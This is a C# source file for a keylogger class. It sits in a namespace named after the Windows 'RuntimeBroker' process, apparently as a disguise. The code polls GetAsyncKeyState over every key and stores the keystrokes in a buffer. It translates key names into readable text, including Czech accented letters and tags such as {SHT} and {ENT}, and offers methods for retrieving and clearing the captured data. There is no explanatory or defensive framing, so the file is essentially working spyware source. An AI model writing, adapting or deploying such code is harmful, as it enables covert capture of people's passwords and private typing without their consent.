using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace RuntimeBroker
{
    public class _logger
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        private String data = "";
        internal string ReplaceChars(string text)
        {
            text = text.Replace("Space", " ");
            text = text.Replace("Delete", "{DEL}");
            text = text.Replace("LShiftKey", "{SHT}");
            text = text.Replace("ShiftKey", "{SHT}");
            text = text.Replace("OemQuotes", "!");
            text = text.Replace("Oemcomma", "{?/,}");
            text = text.Replace("D8", "á");
            text = text.Replace("D2", "ě");
            text = text.Replace("D3", "š");
            text = text.Replace("D4", "č");
            text = text.Replace("D5", "ř");
            text = text.Replace("D6", "ž");
            text = text.Replace("D7", "ý");
            text = text.Replace("D9", "í");
            text = text.Replace("D0", "é");
            text = text.Replace("Back", "{DEL]");
            text = text.Replace("LButton", "{LBC}");
            text = text.Replace("RButton", "{RBC}");
            text = text.Replace("NumPad", "");
            text = text.Replace("OemPeriod", ".");
            text = text.Replace("OemSemicolon", ",");
            text = text.Replace("Oemplus", "%");
            text = text.Replace("Oem4", "/");
            text = text.Replace("LControlKey", "{CTRL}");
            text = text.Replace("ControlKey", "{CTRL}");
            text = text.Replace("Enter", "{ENT}"+Environment.NewLine);
            text = text.Replace("Shift", "{SHT}");
            return text;
        }
        public void GetBuffKeys()
        {
            string buffer = "";
            foreach (Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                    buffer += Enum.GetName(typeof(Keys), i);
            }
            if (buffer.Length >= 1)
            {
                data += buffer;
            }
        }
        internal void cleanData()
        {
            data = String.Empty;
        }

        internal String getData()
        {
            return ReplaceChars(data);
        }
    }
}